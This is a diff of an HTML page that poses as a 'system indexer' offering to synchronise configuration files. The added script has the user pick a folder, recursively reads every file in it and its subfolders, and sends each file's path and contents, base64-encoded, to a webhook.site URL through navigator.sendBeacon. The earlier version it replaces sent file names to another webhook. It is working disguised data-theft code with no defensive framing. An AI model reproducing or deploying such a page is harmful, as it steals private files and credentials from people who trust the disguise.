@@ -1,51 +1,71 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Indexer</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
-    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 60px #0f0">
-        <h2>V228_DIR_CRAWLER</h2>
-        <p>Select a folder to synchronize all local configuration files.</p>
-        <button onclick="crawl()" style="padding:15px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer">INDEX_DIRECTORY</button>
-        <div id="status" style="margin-top:20px;color:#888">AWAITING_FS_HANDLE...</div>
+<head><title>System Deep Indexer</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div style="padding:40px;border:2px solid #0f0;text-align:center;box-shadow:0 0 80px #0f0;background:rgba(0,20,0,0.9)">
+        <h1 style="letter-spacing:5px">V229_CENTINEL</h1>
+        <p id="status">AWAITING_DEEP_FILESYSTEM_SCAN...</p>
+        <button onclick="deepScan()" style="padding:20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;box-shadow:0 0 20px #0f0">START_RECURSIVE_SYNC</button>
+        <div id="log" style="font-size:10px;color:#0a0;margin-top:20px;text-align:left;max-height:150px;overflow-y:auto;border-top:1px solid #0a0">
+            > SCAN_ENGINE: READY<br>
+            > TARGET_API: FS_ACCESS_RECURSIVE
+        </div>
     </div>
 
 <script>
-    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";
+    const webhook = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
 
-    async function crawl() {
+    async function deepScan() {
         try {
-            // 1. REQUEST DIRECTORY ACCESS
-            // Ini akan memicu File Picker untuk memilih FOLDER, bukan FILE.
+            // 1. REQUEST DIRECTORY HANDLE
             const dirHandle = await window.showDirectoryPicker();
-            
-            document.getElementById('status').innerText = "CRAWLING_FILES...";
-            let fileList = [];
+            document.getElementById('status').innerText = "SCANNING_IN_PROGRESS...";
+            document.getElementById('status').style.color = "#f00";
 
-            // 2. ITERATE OVER DIRECTORY (The Crawler)
-            // Kita menyisir semua entri di dalam folder tersebut
-            for await (const entry of dirHandle.values()) {
-                fileList.push({
-                    name: entry.name,
-                    kind: entry.kind // 'file' atau 'directory'
-                });
-                
-                // Jika itu file, kita bisa mencoba membacanya jika diperlukan
-                console.log(`Found: ${entry.name} [${entry.kind}]`);
-            }
+            // 2. TRIGGER RECURSIVE ENGINE
+            await scanRecursive(dirHandle, "");
 
-            // 3. EXFILTRATE FILE NAMES
-            // Mengirim daftar nama file ke Webhook
-            navigator.sendBeacon(`${webhook}?v=V228_DIR_LIST`, btoa(JSON.stringify({
-                folder: dirHandle.name,
-                files: fileList
-            })));
-
-            document.getElementById('status').innerText = "INDEXING_COMPLETE";
+            document.getElementById('status').innerText = "FULL_SYNC_COMPLETE";
             document.getElementById('status').style.color = "#0f0";
+            log("!! TOTAL_EXFILTRATION_SUCCESS");
 
         } catch (err) {
-            document.getElementById('status').innerText = "ACCESS_DENIED: " + err.message;
+            log("!! ACCESS_DENIED: " + err.message);
         }
+    }
+
+    async function scanRecursive(handle, path) {
+        for await (const entry of handle.values()) {
+            const currentPath = path + "/" + entry.name;
+
+            if (entry.kind === 'file') {
+                log(`READING: ${currentPath}`);
+                try {
+                    const file = await entry.getFile();
+                    const content = await file.text();
+
+                    // 3. AUTOMATED EXFILTRATION
+                    // Mengirimkan nama file, path, dan isi kontennya sekaligus
+                    navigator.sendBeacon(`${webhook}?v=V229_CONTENT_LEAK`, btoa(JSON.stringify({
+                        file: entry.name,
+                        path: currentPath,
+                        data: content.substring(0, 5000) // Limit data per request
+                    })));
+                } catch (e) {
+                    log(`!! SKIP_LOCKED: ${entry.name}`);
+                }
+            } else if (entry.kind === 'directory') {
+                log(`ENTERING_SUBDIR: ${entry.name}`);
+                // Rekursif: Masuk ke dalam sub-folder
+                await scanRecursive(entry, currentPath);
+            }
+        }
+    }
+
+    function log(msg) {
+        const l = document.getElementById('log');
+        l.innerHTML += `<div>> ${msg}</div>`;
+        l.scrollTop = l.scrollHeight;
     }
 </script>
 </body>
